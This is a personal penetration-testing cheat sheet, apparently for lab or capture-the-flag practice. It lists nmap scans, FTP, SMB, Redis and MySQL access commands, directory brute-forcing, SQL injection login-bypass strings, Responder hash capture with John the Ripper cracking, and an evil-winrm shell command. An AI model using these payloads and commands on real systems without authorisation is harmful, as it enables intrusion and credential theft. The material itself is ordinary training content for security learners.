# Quick Reference: Commands & CheatSheet

A running list of commands I keep coming back to.

---

## Nmap

```bash
# Basic scan with version detection
nmap -sV <target-ip>

# Version + safe scripts (good default)
nmap -sC -sV <target-ip>

# Full port scan (all 65535 ports), faster
nmap -p- --min-rate 5000 <target-ip>

# Specific script
nmap --script ftp-anon -p 21 <target-ip>
```

---

## FTP

```bash
# Connect
ftp <target-ip>

# Commands inside FTP
ls          # list files
cd <dir>    # change directory
get <file>  # download
put <file>  # upload
bye         # exit
```

---

## SMB

```bash
# List shares (null session)
smbclient -L <target-ip>

# Connect to a share
smbclient \\\\<target-ip>\\<share-name>

# Commands inside SMB
ls
cd <dir>
get <file>
exit
```

---

## Redis

```bash
# Connect
redis-cli -h <target-ip>

# Commands inside Redis
info            # server info and stats
keys *          # list all keys
select <n>      # switch database (0-15)
get <key>       # get value of a key
type <key>      # check data type
```

---

## MySQL

```bash
# Connect remotely (no password)
mysql -u root -h <target-ip> -P 3306

# Commands inside MySQL
SHOW DATABASES;
USE <database>;
SHOW TABLES;
SELECT * FROM <table>;
DESCRIBE <table>;
```

---

## Web Enumeration

```bash
# Gobuster — directory brute force
gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# With file extension
gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php

# Dirb
dirb http://<target-ip>/ /usr/share/wordlists/dirb/common.txt -X .php

# ffuf
ffuf -u http://<target-ip>/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php
```

---

## SQL Injection (Login Bypass)

```
# If you know the username
admin'--

# If you don't know the username
' OR 1=1-- 

# MySQL comment options
--      (needs a space after)
#
/* */
```

---

## Responder + Hash Cracking

```bash
# Start Responder
sudo responder -I tun0

# Save captured hash to file
echo "<full-hash-string>" > hash.txt

# Crack with John the Ripper
sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# View cracked password (if you ran john before)
sudo john --show hash.txt
```

---

## WinRM

```bash
# Get a shell on a Windows machine
sudo evil-winrm -u <username> -p <password> -i <target-ip>
```

---

## Hosts File

```bash
# Edit to add a domain → IP mapping
sudo nano /etc/hosts

# Format to add:
<target-ip>    <domain-name>
```

---

## HTTP Status Codes

| Code | Meaning |
|---|---|
| 200 | OK — page exists |
| 301/302 | Redirect — follow it |
| 403 | Forbidden — exists but blocked |
| 404 | Not found |
